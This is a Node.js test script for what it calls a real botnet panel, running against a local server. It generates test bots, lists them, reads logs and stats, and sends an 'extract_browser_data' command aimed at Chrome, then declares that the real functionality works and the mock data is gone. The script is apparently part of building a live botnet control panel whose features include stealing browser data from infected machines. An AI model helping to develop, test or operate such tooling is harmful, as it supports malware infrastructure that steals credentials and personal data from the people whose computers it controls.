const fetch = require('node-fetch');

async function testRealFunctionality() {
    const baseUrl = 'http://localhost:8080';
    
    console.log(' Testing Real Botnet Panel Functionality...\n');
    
    try {
        // Test 1: Generate test bots
        console.log('1. Testing bot generation...');
        const botResponse = await fetch(`${baseUrl}/api/botnet/generate-test-bots`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ count: 3 })
        });
        const botData = await botResponse.json();
        console.log(' Bot generation:', botData.status === 200 ? 'SUCCESS' : 'FAILED');
        console.log(`   Generated ${botData.data?.testBotsGenerated || 0} test bots\n`);
        
        // Test 2: Check bot status
        console.log('2. Testing bot status...');
        const statusResponse = await fetch(`${baseUrl}/api/botnet/status`);
        const statusData = await statusResponse.json();
        console.log(' Bot status:', statusData.status === 200 ? 'SUCCESS' : 'FAILED');
        console.log(`   Total bots: ${statusData.data?.totalBots || 0}`);
        console.log(`   Online bots: ${statusData.data?.onlineBots || 0}\n`);
        
        // Test 3: List bots
        console.log('3. Testing bot listing...');
        const botsResponse = await fetch(`${baseUrl}/api/botnet/bots`);
        const botsData = await botsResponse.json();
        console.log(' Bot listing:', botsData.status === 200 ? 'SUCCESS' : 'FAILED');
        console.log(`   Found ${botsData.data?.length || 0} bots\n`);
        
        // Test 4: Execute real command
        console.log('4. Testing command execution...');
        const executeResponse = await fetch(`${baseUrl}/api/botnet/execute`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                action: 'extract_browser_data',
                target: 'test-target',
                params: { browser: 'Chrome' }
            })
        });
        const executeData = await executeResponse.json();
        console.log(' Command execution:', executeData.status === 200 ? 'SUCCESS' : 'FAILED');
        console.log(`   Result: ${executeData.data?.result || 'No result'}\n`);
        
        // Test 5: Check logs
        console.log('5. Testing log retrieval...');
        const logsResponse = await fetch(`${baseUrl}/api/botnet/logs`);
        const logsData = await logsResponse.json();
        console.log(' Log retrieval:', logsData.status === 200 ? 'SUCCESS' : 'FAILED');
        console.log(`   Found ${logsData.data?.length || 0} log entries\n`);
        
        // Test 6: Check stats
        console.log('6. Testing stats calculation...');
        const statsResponse = await fetch(`${baseUrl}/api/botnet/stats`);
        const statsData = await statsResponse.json();
        console.log(' Stats calculation:', statsData.status === 200 ? 'SUCCESS' : 'FAILED');
        console.log(`   Total data entries: ${statsData.data?.totalData || 0}\n`);
        
        // Test 7: Test all features
        console.log('7. Testing all features...');
        const testResponse = await fetch(`${baseUrl}/api/botnet/test-all-features`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({})
        });
        const testData = await testResponse.json();
        console.log(' Feature testing:', testData.status === 200 ? 'SUCCESS' : 'FAILED');
        console.log(`   Overall status: ${testData.data?.overallStatus || 'unknown'}\n`);
        
        console.log(' All tests completed!');
        console.log(' Real functionality is working - no more mock data!');
        
    } catch (error) {
        console.error(' Test failed:', error.message);
    }
}

testRealFunctionality();
